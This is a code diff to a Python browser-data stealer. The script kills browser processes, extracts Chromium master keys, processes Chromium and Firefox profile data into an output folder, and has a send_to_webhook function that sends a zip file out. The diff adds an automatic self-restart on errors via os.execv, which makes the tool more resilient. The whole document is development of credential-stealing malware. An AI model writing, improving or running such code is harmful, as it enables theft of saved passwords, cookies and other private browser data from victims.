@@ -12,14 +12,30 @@ import binascii
 import subprocess
 import time
 from io import BytesIO
-import windows
-import windows.crypto
-import windows.security
-import windows.generated_def as gdef
-from contextlib import contextmanager
-from Crypto.Cipher import AES, ChaCha20_Poly1305
 import multiprocessing
 import sys
+import time
+if hasattr(sys.stdout, 'reconfigure'):
+    sys.stdout.reconfigure(encoding='utf-8')
+
+def restart_on_error(e):
+    err_msg = str(e)
+    print(f"[!] Hata yakalandi: {err_msg}")
+    print("[*] Kod 2 saniye icinde yeniden baslatiliyor...")
+    time.sleep(2)
+    os.execv(sys.executable, [sys.executable] + sys.argv)
+
+try:
+    import windows
+    import windows.crypto
+    import windows.security
+    import windows.generated_def as gdef
+except Exception as e:
+    restart_on_error(e)
+    raise e
+
+from contextlib import contextmanager
+from Crypto.Cipher import AES, ChaCha20_Poly1305
 import urllib.request
 import urllib.parse
 import hashlib
@@ -682,35 +698,34 @@ def send_to_webhook(zip_path, webhook_url):
         pass
 
 def main():
-    if hasattr(sys.stdout, 'reconfigure'):
-        sys.stdout.reconfigure(encoding='utf-8')
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
     parser.add_argument('--output-path', required=False)
     args = parser.parse_args()
-    try:
-        print("[*] Browser data collection started...")
-        kill_browser_processes()
-        time.sleep(1)
-        out = args.output_path if args.output_path else "output"
-        if not os.path.exists(out): os.makedirs(out, exist_ok=True)
-        for n, c in BROWSERS.items():
-            print(f"[*] Processing: {c['name']}")
-            try:
-                if c['chromium_based']:
-                    mk = get_master_key(c)
-                    if mk: 
-                        process_chromium_browser(n, c, mk, out)
-                    else:
-                        print(f"[!] Master Key not found for {c['name']}.")
+    print("[*] Browser data collection started...")
+    kill_browser_processes()
+    time.sleep(1)
+    out = args.output_path if args.output_path else "output"
+    if not os.path.exists(out): os.makedirs(out, exist_ok=True)
+    for n, c in BROWSERS.items():
+        print(f"[*] Processing: {c['name']}")
+        try:
+            if c['chromium_based']:
+                mk = get_master_key(c)
+                if mk: 
+                    process_chromium_browser(n, c, mk, out)
                 else:
-                    process_firefox_browser(n, c, out)
-            except Exception as e:
-                print(f"[!] Error processing {c['name']}: {e}")
-        print("[*] Operation completed. Data saved to 'output' folder.")
-    except Exception as e:
-        print(f"[!] Main loop error: {e}")
+                    print(f"[!] Master Key not found for {c['name']}.")
+            else:
+                process_firefox_browser(n, c, out)
+        except Exception as e:
+            print(f"[!] Error processing {c['name']}: {e}")
+    print("[*] Operation completed. Data saved to 'output' folder.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        restart_on_error(e)
+        raise e
